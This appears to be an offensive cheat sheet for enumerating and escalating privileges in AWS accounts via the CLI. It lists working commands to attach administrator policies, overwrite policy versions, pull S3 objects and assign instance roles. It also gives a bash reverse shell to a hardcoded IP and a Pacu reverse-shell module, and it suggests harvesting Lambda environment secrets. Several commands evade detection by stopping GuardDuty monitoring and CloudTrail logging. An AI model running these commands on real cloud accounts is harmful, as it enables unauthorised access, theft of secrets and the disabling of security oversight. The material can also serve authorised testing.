# AWS Enum and Privesc Guide 

## Set a named profile to make using the command line easier 

`aws configure --profile hacker`

---

## whoami

`aws sts get-caller-identity --profile hacker`

---

## Users  

What managed policies are attached to this user? 

`aws iam list-attached-user-policies --user-name myUser --profile hacker`

What in-line policies are attached? 

`aws iam list-user-policies --user-name myUser --profile hacker` 

See the policy document for a specific policy

`aws iam get-user-policy --user-name myUser --policy-name my_policy --profile hacker` 

## Roles 

See role trust policy document

`aws iam get-role --role-name existingRole --profile hacker`

What policies are attached to the role? 

`aws iam list-attached-role-policies --role-name existingRole --profile hacker`

## IAM Policies 

List all IAM policies 

`aws iam list-policies --profile hacker` 

Get policy statement - What permissions does a policy have? 

`aws iam get-policy-version --version-id v1 --policy-arn arn:aws:iam::123456789012:policy/myPolicy --profile hacker`

Attach a policy to a role 

`aws iam attach-role-policy --policy-arn arn:aws:iam::aws:policy/AmazonS3FullAccess --role-name existingRole --profile hacker`

Attach a policy to a user 

`aws iam attach-user-policy --policy-arn arn:aws:iam::aws:policy/AmazonS3FullAccess --user-name existingUser --profile hacker`

Overwrite an existing policy version

`aws iam create-policy-version --policy-arn arn:aws:iam::123456789012:policy/MyPolicy --policy-document file://NewPolicyVersion.json --set-as-default`

### Useful Managed Policy Arns

#### S3 

`arn:aws:iam::aws:policy/AmazonS3FullAccess`

View/Read Only for Everything 

`arn:aws:iam::aws:policy/SecurityAudit`

`arn:aws:iam::aws:policy/job-function/ViewOnlyAccess`

#### IAM

`arn:aws:iam::aws:policy/IAMFullAccess` 

#### EC2

`arn:aws:iam::aws:policy/AmazonEC2FullAccess` 

#### Admin/Power Users

`arn:aws:iam::aws:policy/PowerUserAccess`

`arn:aws:iam::aws:policy/AdministratorAccess`

---

## S3 "look around the file system" 

ls - lists out s3 buckets in the account (globally)

`aws s3 ls` 

List an S3 bucket's contents 

`aws s3api list-objects-v2 --bucket my-s3-bucket-name`

Get objects 

`aws s3api get-object --bucket <bucketName> --profile hacker --key "<object path/name>"`

---

## EC2 

Get the Amazon Linux 2 AMI for your region

`aws ec2 describe-images   --owners amazon   --filters "Name=name,Values=amzn2-ami-hvm-2.0.????????.?-x86_64-gp2" "Name=state,Values=available"   --query "reverse(sort_by(Images, &CreationDate))[:1].ImageId" --output text --region us-east-1 --profile hacker`

Run an instance 

`aws ec2 run-instances --image-id ami-01cc34ab2709337aa --instance-type t2.micro --region us-east-1 --profile hacker`

Run instance with userdata script

`aws ec2 run-instances --image-id ami-abcd1234 --count 1 --instance-type m3.medium \
--key-name my-key-pair --subnet-id subnet-abcd1234 --security-group-ids sg-abcd1234 \
--user-data file://my_script.txt` 

See instance userdata

`aws ec2 describe-instance-attribute --instance-id i-1234567890abcdef0 --attribute userData` 

Get instance state 

`aws ec2 describe-instances --instance-ids i-12345678901234567 --profile hacker --region us-east-1 | jq '.Reservations[].Instances[].State'` 

Create an instance profile 

`aws iam create-instance-profile --instance-profile-name my_instance_profile --profile hacker`

Add a role to newly created or existing profile (Attach desired policies to role above!)

`aws iam add-role-to-instance-profile --role-name existing_role --instance-profile-name my_instance_profile --profile hacker`

Associate instance profile with instance

`aws ec2 associate-iam-instance-profile --instance-id i-12345678901234567 --iam-instance-profile Name=my_instance_profile --profile hacker --region us-east-1` 

Verify association 

`aws ec2 describe-iam-instance-profile-associations --association-ids iip-assoc-12345678901234567 --profile hacker --region us-east-1`

Stop an instance 

`aws ec2 stop-instances --profile hacker --region us-east-1 --instance-ids i-12345678901234567`

---

## Pacu 

Simple Bash Reverse Shell

`bash -i >& /dev/tcp/10.10.10.10/8080 0>&1` 

EC2 Reverse Shell 

`run ec2__startup_shell_script --script reverseShell.sh --instance-ids i-12345678901234567@us-east-1` 

## Lambda

List functions. Inspect ENV variables for juicy loot

`aws lambda list-functions`

## GuardDuty 

Is GuardDuty running? 

`aws guardduty list-detectors --region us-east-1` 

Is GuardDuty setup for Orgs? 

`aws guardduty describe-organization-configuration --detector-id <id> --region
us-east-1` 

The output for this command can be tricky to read. Refer to the docs below: 

```
Output

AutoEnable -> (boolean)

Indicates whether GuardDuty is automatically enabled for accounts added to the organization.
MemberAccountLimitReached -> (boolean)

Indicates whether the maximum number of allowed member accounts are already associated with the delegated administrator account for your organization.
DataSources -> (structure)

Describes which data sources are enabled automatically for member accounts.

S3Logs -> (structure)

Describes whether S3 data event logs are enabled as a data source.

AutoEnable -> (boolean)

A value that describes whether S3 data event logs are automatically enabled for new members of the organization.
```

Which account is the account admin? 

`aws guardduty list-organization-admin-accounts --region us-east-1`

List member accounts with detectors on

`aws guardduty list-members --detector-id <org admin detector id> --region us-east-1`

===May set off GuardDuty/Cloudwatch Alarm/SIEM alerts===

Stop Monitoring Members

`aws stop-monitoring-members --detector-id <org admin detector id> --account-ids "string" "string" ... --region us-east-1`

## CloudTrail 

Tread lightly. Disabling CloudTrail is probably the most watched for event in enterpise AWS

List Trails

`aws cloudtrail list-trails --region us-east-1`

Stop logging CloudTrail calls (if an org is even half-competent this will alert. Move fast.)

`aws cloudtrail stop-logging --name <trail name or arn> --region us-east-1`

